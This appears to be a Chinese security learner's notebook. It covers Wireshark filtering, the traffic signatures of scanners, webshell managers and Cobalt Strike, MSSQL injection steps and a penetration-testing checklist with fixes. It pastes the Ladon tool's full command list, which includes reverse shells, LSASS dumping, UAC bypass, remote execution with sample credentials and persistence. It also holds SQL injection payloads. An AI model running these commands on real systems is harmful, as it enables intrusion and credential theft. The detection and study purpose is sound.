Date：Sun, 01 Jun 2008 12:35:47 GMT  时间
Server：Apache/2、0、61 (Unix)  服务器
Last-Modified：Sun, 01 Jun 2008 12:35:30 GMT 最后一次修改时间
Accept-Ranges：bytes  接受范围
Content-Length：18616  实际传送回来的字节数
Cache-Control：max-age=120  
Expires：Sun, 01 Jun 2008 12:37:47 GMT  
Content-Type：application/xml   返回类型
Age：2  表明该实体从产生到现在经过多长时间了
X-Cache：HIT from 236-41、D07071951、sina、com、cn      <- 反向代理服务器使用的 HTTP 头部
Via：1.0 236-41.D07071951.sina.com.cn:80 (squid/2.6.STABLE13)
Connection：close 连接关闭
```

## wireshark流量分析

学习文章

```
https://xz.aliyun.com/t/13000?time__1311=GqmhBKYK7IZD%2FD0lb5b4rD9DAo%3DFDfhbD
```

### 数据包筛选

#### 筛选指定流量

基础筛选

<img src="image/image-20240718112050521.png" alt="image-20240718112050521" style="zoom:80%;" />

<img src="image/image-20240718112150690.png" alt="image-20240718112150690" style="zoom:80%;" />

可以看到，使用查询语句筛选出了来源ip和目的ip包含我们搜选ip的条

如果要搜索我们ip只要来源ip是这个ip的

我们可以

<img src="image/image-20240718112253880.png" alt="image-20240718112253880" style="zoom:80%;" />

可以看到就只显示了来源ip与我们搜索相关联的

如果要搜索出ip 语法后改为dst即可

<img src="image/image-20240718112349520.png" alt="image-20240718112349520" style="zoom:80%;" />

#### 使用逻辑运算符

在实际应用中我们可以会同时需要筛选很多ip，并且对具体的情况有一些要求，则可以使用逻辑运算符来配合使用，增加筛选的灵活性

Wireshark可以使用一下几种逻辑运算符：

```
&& || !=
```

（1）要求筛选出原ip地址为192.168.43.21且目标地址为 20.210.85.71的流量包

![image-20240709164549359](image/image-20240709164549359.png)

（2）要求筛选出原ip地址为192.168.43.21或源地址为 20.210.85.71的流量包

![image-20240709164554514](image/image-20240709164554514.png)

（3）要求筛选出原ip地址不为192.168.43.21的流量包

![image-20240709164600842](image/image-20240709164600842.png)

#### http模式过滤

在web攻击流量分析中，http显得尤为重要，根据攻击特点过滤http流量能更准确定位攻击；如常见上传webshell使用POST请求、指定URI可疑发现一些上传路径或者后台等，另也可以从包含的一些关键特征判断使用的工具、木马、脚本等。

注：下面的所有包都是使用192.168.159.1访问192.168.159.202服务器的流量包

（1）http请求方式为GET语法：

```
http.request.method==”GET”
```

 我们使用本地浏览器访问192.168.159.202?id=1来模拟一个GET访问

![image-20240709165119046](image/image-20240709165119046.png)

（2）http请求方式为POST语法：

```cobol
http.request.method==”POST”
```

<img src="image/image-20240709165151445.png" alt="image-20240709165151445" style="zoom:80%;" />

![image-20240709165212623](image/image-20240709165212623.png)

（3）请求的URI为/login.php语法：

```cobol
http.request.uri==”/login.php”
```

模拟这个访问也很简单直接在浏览器中输入： http://192.168.159.202/login.php

![image-20240709165232211](image/image-20240709165232211.png)

（4）请求的http中包含sqlmap的语法：

```sql
http contains “sqlmap”
```

![image-20240709165244410](image/image-20240709165244410.png)

![image-20240709165248552](image/image-20240709165248552.png)

（5）请求方式为GET且请求中包含UA信息：

```cobol
http.request.method==”GET” && http contain “User-Agent”
```

![image-20240709165305366](image/image-20240709165305366.png)

#### MAC地址过滤

MAC地址就和ip地址一样是都是网络通信中使用的标识符，在Wireshark中筛选MAC地址与筛序ip地址的形式是差不多的

可以在cmd命令行中输入ipconfig/all来查看本机网卡所对应的mac地址

（1）查看目标MAC地址为00-50-56-C0-00-08的流量包

![image-20240709165535763](image/image-20240709165535763.png)

（2）查看源MAC地址为00-50-56-C0-00-08的流量包

![image-20240709165557085](image/image-20240709165557085.png)

#### 端口筛选

可以通过指定筛选常见端口如445、1433、3306等可以定位相关特殊的服务。

（1）tcp.dstport == 80 筛选tcp协议的目标端口为80 的流量包

![image-20240709165616600](image/image-20240709165616600.png)

（2）tcp.srcport == 80 筛选tcp协议的源端口为80 的流量包

![image-20240709165636069](image/image-20240709165636069.png)

#### 协议筛选

协议过滤可以根据相关服务使用的协议类型进行

```cobol
tcp 筛选协议为tcp的流量包

udp 筛选协议为udp的流量包

arp/icmp/http/ftp/dns/ip 筛选协议为arp/icmp/http/ftp/dns/ip的流量包
```

这里就以icmp包为例：

我们使用本地192.168.159.1ping192.168.159.202来产生icmp流量包

<img src="image/image-20240709165715990.png" alt="image-20240709165715990" style="zoom:80%;" />

<img src="image/image-20240709165722101.png" alt="image-20240709165722101" style="zoom:80%;" />

#### 包长度筛选

## wireshark常见恶意流量分析

### 网站流量特征分析

#### dirsearch

主要是一个python写的目录扫描工具

主要特征： 通过显示过滤器,过滤 http.request数据流，可以在数据流中看到大量http GET请求再对路径以及文件进行爆破，可以发现在info中的路径有很明显的顺序,例如dir将a开头的路径跑完后就开始跑b开头的路径如此反复,所以在遇到有类似特征的流量，可以初步判断为dirsearch攻击。

<img src="image/image-20240709171149298.png" alt="image-20240709171149298" style="zoom:80%;" />

可以看到很明显的目录扫描流量条

**示例**

![image-20240711153445845](image/image-20240711153445845.png)

#### sqlmap

主要是用户对于sql注入漏洞的扫描和利用

主要特征：依然是通过wireshark的显示过滤器过滤sqlmap攻击流量包 过滤 http.request后，可以发现info中有大量的sql语句。

<img src="image/image-20240709172759047.png" alt="image-20240709172759047" style="zoom:80%;" />

<img src="image/image-20240709173053727.png" alt="image-20240709173053727" style="zoom:80%;" />

流量

![image-20240718112518589](image/image-20240718112518589.png)

只要攻击者没有设置，在流量的请求头可以看到很明显的sqlmap特征

![image-20240718112548571](image/image-20240718112548571.png)

如果需要过滤sqlmap的数据流 使用 http.user_agent contains sqlmap 可以将包含sql的数据流过滤出来，进行下一步分析。

### 漏洞扫描器流量分析

#### dwvs









#### nmap

主要用于端口扫描

主要特征：使用显示过滤器过滤namp流量包

```
tcp && ip.dst == [namp扫描的ip]
```

可以发现有大量的tcp包 在对目标ip进行端口访问

<img src="image/image-20240709174843326.png" alt="image-20240709174843326" style="zoom:80%;" />

**示例流量：**

![image-20240711145403790](image/image-20240711145403790.png)

#### aazhen(thinkphp)漏洞扫描器

![image-20240712110124714](image/image-20240712110124714.png)

请求带个think尝试命令执行

#### ladon综合扫描工具

##### 概述

```
大型内网渗透扫描器&Cobalt Strike，Ladon7.2内置94个模块，包含信息收集/存活主机/端口扫描/服务识别/密码爆破/漏洞检测/漏洞利用。漏洞检测含MS17010/SMBGhost/Weblogic/ActiveMQ/Tomcat/Struts2，密码口令爆破(Mysql/Oracle/MSSQL)/FTP/SSH(Linux)/VNC/Windows(IPC/WMI/SMB/Netbios/LDAP/SmbHash/WmiHash/Winrm),远程执行命令(wmiexe/psexec/atexec/sshexec/webshell),降权提权Runas、GetSystem，Poc/Exploit,支持Cobalt Strike 3.X-4.0
```

##### **使用方法**

```
005 ICMP扫描存活主机
Ladon 192.168.1.8/24 Ping
006 SMBGhost漏洞检测 CVE-2020-0796 （IP、机器名、漏洞编号、操作系统版本）
Ladon 192.168.1.8/24 SMBGhost
007 扫描Web信息/Http服务
Ladon 192.168.1.8/24 WebScan
008 扫描C段站点URL域名
Ladon 192.168.1.8/24 UrlScan
009 扫描C段站点URL域名
Ladon 192.168.1.8/24 SameWeb
010 扫描子域名、二级域名
Ladon baidu.com SubDomain
011 域名解析IP、主机名解析IP
Ladon baidu.com DomainIP Ladon baidu.com HostIP
012 域内机器信息获取
Ladon AdiDnsDump 192.168.1.8 （Domain IP）
013 扫描C段端口、指定端口扫描
Ladon 192.168.1.8/24 PortScan Ladon 192.168.1.8 PortScan 80,445,3389
014 扫描C段WEB以及CMS（75种Web指纹识别）
Ladon 192.168.1.8/24 WhatCMS
015 扫描思科设备
Ladon 192.168.1.8/24 CiscoScan Ladon http://192.168.1.8 CiscoScan
016 枚举Mssql数据库主机 （数据库IP、机器名、SQL版本）
Ladon EnumMssql
017 枚举网络共享资源 （域、存活IP、共享路径）
Ladon EnumShare
018 扫描LDAP服务器
Ladon 192.168.1.8/24 LdapScan
019 扫描FTP服务器
Ladon 192.168.1.8/24 FtpScan
暴力破解/网络认证/弱口令/密码爆破/数据库/网站后台/登陆口/系统登陆
密码爆破详解参考SSH：http://k8gege.org/Ladon/sshscan.html
020 445端口 SMB密码爆破(Windows)
Ladon 192.168.1.8/24 SmbScan
021 135端口 Wmi密码爆破(Windowns)
Ladon 192.168.1.8/24 WmiScan
022 389端口 LDAP服务器、AD域密码爆破(Windows)
Ladon 192.168.1.8/24 LdapScan
023 5985端口 Winrm密码爆破(Windowns)
Ladon 192.168.1.8/24 WinrmScan.ini
024 445端口 SMB NTLM HASH爆破(Windows)
Ladon 192.168.1.8/24 SmbHashScan
025 135端口 Wmi NTLM HASH爆破(Windows)
Ladon 192.168.1.8/24 WmiHashScan
026 22端口 SSH密码爆破(Linux)
Ladon 192.168.1.8/24 SshScan Ladon 192.168.1.8:22 SshScan
027 1433端口 Mssql数据库密码爆破
Ladon 192.168.1.8/24 MssqlScan
028 1521端口 Oracle数据库密码爆破
Ladon 192.168.1.8/24 OracleScan
029 3306端口 Mysql数据库密码爆破
Ladon 192.168.1.8/24 MysqlScan
030 7001端口 Weblogic后台密码爆破
Ladon http://192.168.1.8:7001/console WeblogicScan Ladon 192.168.1.8/24 WeblogicScan
031 5900端口 VNC远程桌面密码爆破
Ladon 192.168.1.8/24 VncScan
032 21端口 Ftp服务器密码爆破
Ladon 192.168.1.8/24 FtpScan
033 8080端口 Tomcat后台登陆密码爆破
Ladon 192.168.1.8/24 TomcatScan Ladon http://192.168.1.8:8080/manage TomcatScan
034 Web端口 401基础认证密码爆破
Ladon http://192.168.1.8/login HttpBasicScan
035 445端口 Impacket SMB密码爆破(Windowns)
Ladon 192.168.1.8/24 SmbScan.ini
036 445端口 IPC密码爆破(Windowns)
Ladon 192.168.1.8/24 IpcScan.ini
漏洞检测/漏洞利用/Poc/Exp
037 SMB漏洞检测(CVE-2017-0143/CVE-2017-0144)
Ladon 192.168.1.8/24 MS17010
038 Weblogic漏洞检测(CVE-2019-2725/CVE-2018-2894)
Ladon 192.168.1.8/24 WeblogicPoc
039 PhpStudy后门检测(phpstudy 2016/phpstudy 2018)
Ladon 192.168.1.8/24 PhpStudyPoc
040 ActiveMQ漏洞检测(CVE-2016-3088)
Ladon 192.168.1.8/24 ActivemqPoc
041 Tomcat漏洞检测(CVE-2017-12615)
Ladon 192.168.1.8/24 TomcatPoc
042 Weblogic漏洞利用(CVE-2019-2725)
Ladon 192.168.1.8/24 WeblogicExp
043 Tomcat漏洞利用(CVE-2017-12615)
Ladon 192.168.1.8/24 TomcatExp
044 Struts2漏洞检测(S2-005/S2-009/S2-013/S2-016/S2-019/S2-032/DevMode)
Ladon 192.168.1.8/24 Struts2Poc
FTP下载、HTTP下载
045 HTTP下载
Ladon HttpDownLoad http://k8gege.org/Download/Ladon.rar
046 Ftp下载
Ladon FtpDownLoad 127.0.0.1:21 admin admin test.exe
加密解密(HEX/Base64)
047 Hex加密解密
Ladon 123456 EnHex Ladon 313233343536 DeHex
048 Base64加密解密
Ladon 123456 EnBase64 Ladon MTIzNDU2 DeBase64
网络嗅探
049 Ftp密码嗅探
Ladon FtpSniffer 192.168.1.5
050 HTTP密码嗅探
Ladon HTTPSniffer 192.168.1.5
051 网络嗅探
Ladon Sniffer
密码读取
052 读取IIS站点密码、网站路径
Ladon IISpwd
DumpLsass内存密码
Ladon DumpLsass
信息收集
053 进程详细信息
Ladon EnumProcess Ladon Tasklist
054 获取命令行参数
Ladon cmdline Ladon cmdline cmd.exe
055 获取渗透基础信息
Ladon GetInfo Ladon GetInfo2
056 .NET & PowerShell版本
Ladon NetVer Ladon PSver Ladon NetVersion Ladon PSversion
057 运行时版本&编译环境
Ladon Ver Ladon Version
远程执行(psexec/wmiexec/atexec/sshexec)
445端口 PSEXEC远程执行命令（交互式）
net user \192.168.1.8 k8gege520 /user:k8gege Ladon psexec 192.168.1.8 psexec> whoami nt authority\system
058 135端口 WmiExec远程执行命令 （非交互式）
Ladon wmiexec 192.168.1.8 k8gege k8gege520 whoami
059 445端口 AtExec远程执行命令（非交互式）
Ladon wmiexec 192.168.1.8 k8gege k8gege520 whoami
060 22端口 SshExec远程执行命令（非交互式）
Ladon SshExec 192.168.1.8 k8gege k8gege520 whoami Ladon SshExec 192.168.1.8 22 k8gege k8gege520 whoami
061 JspShell远程执行命令（非交互式）
Usage：Ladon JspShell type url pwd cmd Example: Ladon JspShell ua http://192.168.1.8/shell.jsp Ladon whoami
062 WebShell远程执行命令（非交互式）
Usage：Ladon WebShell ScriptType ShellType url pwd cmd
Example: Ladon WebShell jsp ua http://192.168.1.8/shell.jsp Ladon whoami
Example: Ladon WebShell aspx cd http://192.168.1.8/1.aspx Ladon whoami
Example: Ladon WebShell php ua http://192.168.1.8/1.php Ladon whoami
提权降权
063 BypassUac 绕过UAC执行,支持Win7-Win10
Ladon BypassUac c:\1.exe Ladon BypassUac c:\1.bat
064 GetSystem 提权或降权运行程序
Ladon GetSystem cmd.exe Ladon GetSystem cmd.exe explorer
065 Runas 模拟用户执行命令
Ladon Runas user pass cmd
其它功能
066 Win2008一键启用.net 3.5
Ladon EnableDotNet
067 获取内网站点HTML源码
Ladon gethtml http://192.168.1.1
068 检测后门
Ladon CheckDoor Ladon AutoRun
069 获取本机内网IP与外网IP
Ladon GetIP
070 一键迷你WEB服务器
Ladon WebSer 80 Ladon web 80
反弹Shell
071 反弹TCP NC Shell
Ladon ReverseTcp 192.168.1.8 4444 nc
072 反弹TCP MSF Shell
Ladon ReverseTcp 192.168.1.8 4444 shell
073 反弹TCP MSF MET Shell
Ladon ReverseTcp 192.168.1.8 4444 meter
074 反弹HTTP MSF MET Shell
Ladon ReverseHttp 192.168.1.8 4444
075 反弹HTTPS MSF MET Shell
Ladon ReverseHttps 192.168.1.8 4444
076 反弹TCP CMD & PowerShell Shell
Ladon PowerCat 192.168.1.8 4444 cmd Ladon PowerCat 192.168.1.8 4444 psh
077 反弹UDP Cmd & PowerShell Shell
Ladon PowerCat 192.168.1.8 4444 cmd udp Ladon PowerCat 192.168.1.8 4444 psh udp
078 RDP桌面会话劫持（无需密码）
Ladon RDPHijack 3 Ladon RDPHijack 3 console
079 OXID定位多网卡主机
Ladon 192.168.1.8/24 EthScan Ladon 192.168.1.8/24 OxidScan
080 查看用户最近访问文件
Ladon Recent
081 添加注册表Run启动项
Ladon RegAuto Test c:\123.exe
082 AT计划执行程序(无需时间)(system权限)
Ladon at c:\123.exe Ladon at c:\123.exe gui
083 SC服务加启动项&执行程序(system权限）
Ladon sc c:\123.exe Ladon sc c:\123.exe gui Ladon sc c:\123.exe auto ServerName
084 MS16135提权至SYSTEM
Ladon ms16135 whoami
085 BadPotato服务用户提权至SYSTEM
Ladon BadPotato cmdline
086 SweetPotato服务用户提权至SYSTEM
Ladon SweetPotato cmdline
087 whoami查看当前用户权限以及特权
Ladon whoami
088 Open3389一键开启3389
Ladon Open3389
089 RdpLog查看3389连接记录
Ladon RdpLog
090 QueryAdmin查看管理员用户
Ladon QueryAdmin
091 激活内置管理员Administrator
Ladon ActiveAdmin
092 激活内置用户Guest
Ladon ActiveGuest
093 查看本机命名管道
Ladon GetPipe
094 139端口Netbios协议Windows密码爆破
Ladon 192.168.1.8/24 NbtScan
```

##### 示例

001、多协议探测存活主机 （IP、机器名、MAC地址、制造商），直接输入要扫描的ip段，选择OnlinePC

<img src="image/image-20240712143138831.png" alt="image-20240712143138831" style="zoom:67%;" />

002、多协议识别操作系统 （IP、机器名、操作系统版本、开放服务），输入ip地址，选择OsScan

<img src="image/image-20240712142949582.png" alt="image-20240712142949582" style="zoom:67%;" />

003，扫描存活主机

<img src="image/image-20240712143334515.png" alt="image-20240712143334515" style="zoom: 67%;" />

004、扫描SMB漏洞MS17010

<img src="image/image-20240712143743126.png" alt="image-20240712143743126" style="zoom:67%;" />

#### laravel框架漏洞

laravel框架漏洞



<img src="image/image-20240712150551067.png" alt="image-20240712150551067" style="zoom:67%;" />

<img src="image/image-20240712150554564.png" alt="image-20240712150554564" style="zoom: 50%;" />

#### weblogic tool

<img src="image/image-20240712151739335.png" alt="image-20240712151739335" style="zoom:67%;" />

直攻7001

### webshell管理工具流量特征分析

#### 蚁剑

主要特征：蚁剑是明文传输（即使使用了加密与编码，也会有包传输密码协商过程，该过程也会有明文存在）即：在post包中的html可以看到传入的参数 观察多个POST包中可以发现html下属的form item都有一个display_errors

<img src="image/image-20240710153541817.png" alt="image-20240710153541817" style="zoom:80%;" />

可以看到有比较明显的display_errors

右键，选择作为过滤器应用中选中

![image-20240710153950491](image/image-20240710153950491.png)

将显示过滤器中多余的信息删去，只留下 urlencoded-form.value contains "display_errors"

![image-20240710154102903](image/image-20240710154102903.png)

然后在追踪http 通过url解密，就可以实现分析攻击者的操作，溯源等操作

<img src="image/image-20240710154136306.png" alt="image-20240710154136306" style="zoom:80%;" />

#### 冰蝎

也是一个webshell管理工具

主要特征： 冰蝎2.0，3.0，4.0版本之间各有差异
例如4.0的特征：
在4.0更新的源代码中，定义了14个user-agen

```
"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36 Edg/99.0.1150.55",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko)
Chrome/84.0.4147.125 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko)
Chrome/84.0.4147.125 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0",
"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
```

大部分为第一个user-agent

<img src="image/image-20240710154638200.png" alt="image-20240710154638200" style="zoom:80%;" />

如果需要拦截这个攻击，可以在防火墙中拦截Chrome/89.0.4389.114 这个版本的流量 因为现在chrome更新到100.xx的版本了 只要攻击者或者极少用户使用，影响不大

![image-20240710154836550](image/image-20240710154836550.png)

**2.请求体头部字节与响应头部字节不会变化**

<img src="image/image-20240710160239677.png" alt="image-20240710160239677" style="zoom:80%;" />

<img src="image/image-20240710160243696.png" alt="image-20240710160243696" style="zoom:80%;" />

可以发现他们请求体中的key值开头一直不变 这是在实际情况是不可能的 所以在看到此特征的流量可以直接判断为冰蝎。

#### 哥斯拉

也是一款webshell管理工具

```
主要特征：哥斯拉客户端与 shell 建连初期的三个固定行为特征，且顺序出现在同一个 TCP 连接中。可以总结为：
特征：发送一段固定代码（payload），http 响应为空
特征：发送一段固定代码（test），执行结果为固定内容
特征：发送一段固定代码（getBacisInfo）
先发送一段pass的加密密文
```

<img src="image/image-20240710162015526.png" alt="image-20240710162015526" style="zoom:80%;" />

然后目标服务器会返回一串空回复

<img src="image/image-20240710162311589.png" alt="image-20240710162311589" style="zoom:80%;" />

可以看到响应包是一串空回复

在通过交互2次 返回固定值 密文

<img src="image/image-20240710165149697.png" alt="image-20240710165149697" style="zoom:80%;" />

哥斯拉的响应体中有一个特征是前16位和后16为会组成一个32位md5 正则匹配类似于(?i:[0-9A-F]{16})[\w+/]{4,}=?=?(?i:[0-9A-F]{16})
可以在返回包中的密文发现 前16和后16为一个32位的MD5值

<img src="image/image-20240710165602338.png" alt="image-20240710165602338" style="zoom:80%;" />

### 常见c2远控服务器特征流量分析

#### metasploit











#### cobaltstrike

cs内网操作，shell相关，用于模拟网络攻击、横向移动、特权升级、持久化访问以及命令和控制等任务。

主要特征：
cs使用的http协议 cs流量包的第一个GET请求 有一个随机编码 IPYK转换为ascii 之和与 256 取余计算值等于 92 ，下载stage payload的过程uri符合 checksum8 规则，即：路径的 ascii 之和与 256 取余计算值等于 92

<img src="image/image-20240710171258898.png" alt="image-20240710171258898" style="zoom:80%;" />

(2) c2服务器如果没有任务下发，会有规律的请求响应间隔，用于维持连接，比如这里是每间隔3s，发一次包（间隔时间可以在cs内设置） 有些响应在4s，是因为网络有延迟不影响

![image-20240710171345053](image/image-20240710171345053.png)

如果cs服务器有任务下发，则会加密放在http心跳包的cookie里面，下发后，靶机完成指令，也同样会返回一个post包都加密并隐藏在cookie中。

```
！@#￥%……&*（）——+&&7L
```

## MSsql注入

### 概述

SQL Server 是一个**关系数据库管理系统**。经常与asp或者aspx一起使用

### 详解

#### 系统自带库

MSSQL安装后默认带了6个数据库，其中4个系统级库：master，model，tempdb和msdb；2个示例库：Northwind Traders和pubs。

```
master：主要为系统控制数据库，其中包括了所有配置信息、用户登录信息和当前系统运行情况。
model：模版数据库
tempdb：临时容器
msdb：主要为用户使用，所有的告警、任务调度等都在这个数据库中。
```

#### 系统自带表

MSSQL数据库与Mysql数据库一样，有安装自带的数据表sysobjects和syscolumns等，其中需要了解的就是这两个数据表

```
sysobjects：记录了数据库中所有表，常用字段为id、name和xtype。
syscolumns：记录了数据库中所有表的字段，常用字段为id、name和xtype。

//id为标识，name为对应的表名和字段名，xtype为所对应的对象类型
```

### 权限问题

sqlserver存在三种权限：

```
sa:能对所有库操作
dbowner:只能对所拥有的库操作
public
```

Msssql的默认端口号是1433，oracle的端口号是1521，mysql是3306，在windows下通过netstat -an -p tcp -o指令就能看到，并且可以查看到对于的进程pid，通过任务管理器可以查看到进程是 谁。

mssql数据库中有两种用户：windows系统用户和sql用户。windows系统用户只能本地连接，sql用户可以本地也可以远程

### 注入流程

```
1、判断注入点
' 单引号是否报错
and 1=1 / and 1=2 页面是否相同

2、判断数据库类型是否为MSSQL
and (select count(*) from sysobjects)>0
and exists(select * from sysobjects)

3、判断注入点权限
//当前是否为sa
and exists(select is_srvrolemember('sysadmin'))
或and (select is_srvrolemember('sysadmin'))>0
//判断当前用户写文件、读文件的权限
and exists(select is_srvrolemember('db_owner'))
或and (select is_srvrolemember('db_owner'))>0
//判断是否有public权限，可以爆破表
and exists(select is_srvrolemember('public'))
或and (select is_srvrolemember('public'))>0

4、查询数据库名
db_name(N)  	表示当前数据库，其中的参数表示第N个数据库，从0开始

5、查询当前用户

6、查表名

7、爆数据


//常用函数
db_name(N)  	表示当前数据库，其中的参数表示第N个数据库，从0开始
@@version			数据库版本
User_Name() 	当前用户
host_name()		计算机名称

//是否站库分离,报错是站库分离
1' and ((select host_name())=(select @@SERVERNAME))--+

//排序&获取下一条数据
mssql数据库中没有limit排序获取字段，但是可以使用top 1来显示数据中的第一条数据，后面与Oracle数据库注入一样，使用<>或not in 来排除已经显示的数据，获取下一条数据。但是与Oracle数据库不同的是使用not in的时候后面需要带上(‘’)，类似数组，也就是不需要输入多个not in来获取数据，这可以很大程序减少输入的数据量，如下：
//使用<>获取数据 <> : 不等于
union all select top 1 null,id,name,null from dbo.syscolumns where id='5575058' and name<>'id' and name<>'username'--#
//使用not in获取数据
union all select top 1 null,id,name,null from dbo.syscolumns where id='5575058' and name not in ('id','username')--#
```

#### 联合注入

# 7.17

学习文章：

```
https://blog.csdn.net/suruoxun/article/details/139530306
```

## 渗透测试手法

### 01信息搜集

#### 域名搜集

##### 域名ip端口

**域名信息查询：**信息可用于后续渗透

<img src="image/image-20240717104558901-17212720446851.png" alt="image-20240717104558901" style="zoom:80%;" />

**IP信息查询：**

确认域名对应IP，确认IP是否真实，确认通信是否正常

**端口查询：**

用nmap等工具进行端口扫描，看端口开放的情况

#### 指纹识别

其实就是网站的信息。比如通过可以访问的资源，如网站首页，查看源代码:

- 看看是否存在文件遍历的漏洞（如图片路径，再通过../遍历文件）
- 是否使用了存在漏洞的框架（如果没有现成的就自己挖）

```
源代码，文件遍历，漏洞框架
```

### 02漏洞扫描

#### 主机扫描

**Nessus**
经典主机漏扫工具，看看有没有CVE漏洞：

<img src="image/image-20240717105109807-17212720446852.png" alt="image-20240717105109807" style="zoom:80%;" />

#### web扫描

- AWVS（Acunetix | Website Security Scanner）扫描器

<img src="image/image-20240717105152734-17212720446853.png" alt="image-20240717105152734" style="zoom:80%;" />

扫描器少扫，危害较大，可以手测着

### 03渗透测试

#### 弱口令漏洞

**漏洞描述**
目标网站管理入口（或数据库等组件的外部连接）使用了容易被猜测的简单字符口令、或者是默认系统账号口令。

**渗透测试**
**① 如果不存在验证码，则直接使用相对应的弱口令字典使用burpsuite 进行爆破**
**② 如果存在验证码，则看验证码是否存在绕过、以及看验证码是否容易识别**

```
是否存在单一报错:比如密码错误，账号错误这种

是否存在可以无限次的试错，就可以无限次的报错

验证码是否可以重复使用
```

风险评级：高风险

**安全建议**

```
① 默认口令以及修改口令都应保证复杂度，比如：大小写字母与数字或特殊字符的组合，口令长度不小于8位等
② 定期检查和更换网站管理口令
```



#### 文件下载漏洞

**漏洞描述**
一些网站由于业务需求，可能提供文件查看或下载的功能，如果对用户查看或下载的文件不做限制，则恶意用户就能够查看或下载任意的文件，可以是**源代码文件、敏感文件**等。

**渗透测试**
**① 查找可能存在文件包含的漏洞点，比如js，css等页面代码路径**
**② 看看有没有文件上传访问的功能**
**③ 采用../来测试能否夸目录访问文件**

风险评级：高风险

**安全建议**

```
① 采用白名单机制限制服务器目录的访问，以及可以访问的文件类型(小心被绕过)
② 过滤【./】等特殊字符
③ 采用文件流的访问返回上传文件（如用户头像），不要通过真实的网站路径。
```

**示例：**tomcat，默认关闭路径浏览的功能：

```
<param-name>listings</param-name> 
<param-value>false</param-value>
```



#### 任意文件上传漏洞

**漏洞描述**
目标网站允许用户向网站直接上传文件，但未对所上传文件的类型和内容进行严格的过滤。

**渗透测试**
**① 收集网站信息，判断使用的语言（PHP，ASP，JSP）**
**② 过滤规则绕过方法：文件上传绕过技巧**

风险评级：高风险

**安全建议**

```
① 对上传文件做有效文件类型判断，采用白名单控制的方法，开放只允许上传的文件型式；
② 文件类型判断，应对上传文件的后缀、文件头、图片类的预览图等做检测来判断文件类型，同时注意重命名（Md5加密）上传文件的文件名避免攻击者利用WEB服务的缺陷构造畸形文件名实现攻击目的；
③ 禁止上传目录有执行权限；
④ 使用随机数改写文件名和文件路径，使得用户不能轻易访问自己上传的文件。
```



#### 命令注入漏洞

漏洞描述
目标网站未对用户输入的字符进行特殊字符过滤或合法性校验，**允许用户输入特殊语句，导致各种调用系统命令的web应用，会被攻击者通过命令拼接、绕过黑名单等方式，在服务端运行恶意的系统命令**。

渗透测试

风险评级：高风险

安全建议

```
① 拒绝使用拼接语句的方式进行参数传递；
② 尽量使用白名单的方式（首选方式）；
③ 过滤危险方法、特殊字符，如：【|】【&】【；】【'】【"】等
```



#### SQL注入漏洞

**漏洞描述**
目标网站未对用户输入的字符进行特殊字符过滤或合法性校验，允许用户输入特殊语句查询后台数据库相关信息

**渗透测试**
**① 手动测试：判断是否存在SQL注入，判断是字符型还是数字型，是否需要盲注**
**② 工具测试：使用sqlmap等工具进行辅助测试**

风险评级：高风险

**安全建议**

```
① 防范SQL注入攻击的最佳方式就是将查询的逻辑与其数据分隔，如Java的预处理，PHP的PDO
② 拒绝使用拼接SQL的方式
```



#### 跨站脚本漏洞

**漏洞描述**
当应用程序的网页中包含不受信任的、未经恰当验证或转义的数据时，或者使用可以创建 HTML或JavaScript 的浏览器 API 更新现有的网页时，就会出现 XSS 缺陷。XSS 让攻击者能够在受害者的浏览器中执行脚本，并劫持用户会话、破坏网站或将用户重定向到恶意站点。

**三种XSS漏洞：**
**① 存储型：用户输入的信息被持久化，并能够在页面显示的功能，都可能存在存储型XSS，例如用户留言、个人信息修改等。**
**② 反射型：URL参数需要在页面显示的功能都可能存在反射型跨站脚本攻击，例如站内搜索、查询功能。**
**③ DOM型：涉及DOM对象的页面程序，包括：document.URL、document.location、document.referrer、window.location等**

**渗透测试**
**存储型，反射型，DOM型**

风险评级：高风险   

**安全建议**

```
① 不信任用户提交的任何内容，对用户输入的内容，在后台都需要进行长度检查，并且对【<】【>】【"】【'】【&】等字符做过滤
② 任何内容返回到页面显示之前都必须加以html编码，即将【<】【>】【"】【'】【&】进行转义。
```



#### **跨站请求伪造漏洞**

**漏洞描述**
CSRF，全称为Cross-Site Request Forgery，跨站请求伪造，是一种网络攻击方式，它可以在用户毫不知情的情况下，以用户的名义伪造请求发送给被攻击站点，从而在未授权的情况下进行权限保护内的操作，如修改密码，转账等。

**渗透测试**

风险评级：中风险（如果相关业务极其重要，则为高风险）

**安全建议**

```
① 使用一次性令牌：用户登录后产生随机token并赋值给页面中的某个Hidden标签，提交表单时候，同时提交这个Hidden标签并验证，验证后重新产生新的token，并赋值给hidden标签；
② 适当场景添加验证码输入：每次的用户提交都需要用户在表单中填写一个图片上的随机字符串；
③ 请求头Referer效验，url请求是否前部匹配Http(s)://ServerHost
④ 关键信息输入确认提交信息的用户身份是否合法，比如修改密码一定要提供原密码输入
⑤ 用户自身可以通过在浏览其它站点前登出站点或者在浏览器会话结束后清理浏览器的cookie；
```



#### 内部后台地址暴露

**漏洞描述**
一些**仅被内部访问的地址，对外部暴露**了，如：**管理员登陆页面；系统监控页面；API接口描述页面等**，这些会导致信息泄露，后台登陆等地址还可能被爆破。

**渗透测试**
**① 通过常用的地址进行探测，如login.html，manager.html，api.html等；**
**② 可以借用burpsuite和常规页面地址字典，进行扫描探测**

风险评级：中风险

**安全建议**

```
① 禁止外网访问后台地址
